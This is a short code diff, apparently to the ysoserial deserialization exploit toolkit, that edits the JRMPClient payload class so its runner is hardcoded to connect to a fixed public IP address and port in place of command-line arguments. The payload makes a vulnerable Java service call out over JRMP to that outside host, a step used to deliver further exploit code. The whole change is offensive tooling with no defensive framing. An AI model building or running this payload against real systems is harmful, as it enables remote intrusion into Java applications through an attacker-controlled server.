@@ -77,6 +77,6 @@ public class JRMPClient extends PayloadRunner implements ObjectPayload<Object> {
 
     public static void main(final String[] args) throws Exception {
 //        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());
-        PayloadRunner.run(JRMPClient.class, args);
+        PayloadRunner.run(JRMPClient.class, new String[]{"8.129.107.19:7777"});
     }
 }
